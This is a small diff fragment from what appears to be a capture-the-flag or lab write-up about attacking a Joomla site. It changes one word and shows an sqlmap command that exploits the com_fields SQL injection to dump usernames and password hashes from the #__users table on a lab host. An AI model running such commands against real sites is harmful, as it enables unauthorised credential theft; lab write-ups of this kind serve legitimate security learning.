@@ -73,7 +73,7 @@ Table: #__users
 | username | non-numeric |
 +----------+-------------+
 ```
-Then, I tried to enumerate the #__users table using SQLmap. My goal was to gather the users and their passwords with the command below:
+Then, I tried to exploit the #__users table using SQLmap. My goal was to gather the users and their passwords with the command below:
 
 ```bash
 sqlmap -u "http://10.0.2.12/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" -D joomladb -T '#__users' -C name,password --dump
